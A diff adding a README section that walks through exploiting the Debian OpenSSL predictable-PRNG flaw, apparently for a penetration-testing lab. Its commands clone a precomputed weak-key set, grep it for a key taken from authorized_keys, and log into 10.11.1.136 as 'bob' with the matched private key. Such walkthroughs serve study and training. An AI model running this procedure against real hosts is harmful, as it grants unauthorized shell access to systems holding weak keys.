@@ -1,4 +1,34 @@
-# Debian OpenSSL Predictable PRNG Toys 
+## SSH Key Predictable PRNG (Authorized_Keys) Process
+
+Bruteforce the the private key using the g0tmi1k's debian-ssh data package when authorized_keys in hand.
+
+The authorized_keys file will be something like (ssh-dss ....):
+
+```
+ssh-dss AAAAB3NzaC1kc3MAAACBAOgzzMCD3Im5bRnAVdV3yLwTsyNAi3IiFShIfx9bUcUNmyFDM7SaFrVBuuIW+2qnDF7vybPiMNI9/dQ7ck2gLUqPu2F4gfXml8W9RKcqTOVksRmQ5s0O4c88mCqV3F1nzKKMSZbK9yYWbafabX91f2SinBQZbfMGv8+R2TyE78LjAAAAFQDXtJ7Pca0RkEBFcBLfPzmCUBpSeQAAAIEAlK4NYlfGt3uInBaKG0kK/N0nZwX7ji++5xSiLLjI/0M9xacdWaZcPBZ4GretGGIhnYEPlBote8GlG1Ap7li39ATazIXJQguG+Mgun3de73RugX/oGsUt5oatCS2Lo9mfRBijlVYChLyQbgkZMwKziwR1BHUWE/jkCKT7bPEJvw8AAACBAJZHIWHJybvrIcs9oB5hTL/8r+C9gDx+R3vcEFQq58D/UDi5FWzA71IZfcOt2+EPabP77gB6Ad/nNy3BrqmkocwLX+Of1uwMhgD63UeE5fUOuIbW+z4OF1M9tuzFAGALDMHJSx8U8Z11lsiuO4Owx11pAo8Ebq0sKNDd0GzvVQxE root@debian40server
+```
+
+Get the debian SSH repo:
+
+```
+git clone https://github.com/g0tmi1k/debian-ssh
+tar vjxf debian-ssh/common_keys/debian_ssh_dsa_1024_x86.tar.bz2
+```
+
+Copy the first 30 (approx.) characters after ssh-dss in the authorized_keys, then search it in the repo using grep -lr:
+```shell
+(kali㉿kali)-[~/…/g0tmi1k-debian-ssh/common_keys/dsa/1024]
+└─$ grep -lr "AAAAB3NzaC1kc3MAAACBAOgzzMCD3Im5bRnAVdV3yLwTsyNAi3IiFShIfx9bUcUNmyFDM7SaFrVBuuI"    
+f1fb2162a02f0f7c40c210e6167f05ca-16858.pub
+```
+
+Finally, use the co-located private key file of found .pub file to ssh:
+
+```shell
+kali@kali:$ sudo ssh -i f1fb2162a02f0f7c40c210e6167f05ca-16858  bob@10.11.1.136
+```
+
+## Debian OpenSSL Predictable PRNG Toys 
 
 
 ![DebianCartoon](SalvagedArchives/DebianCartoon.png)
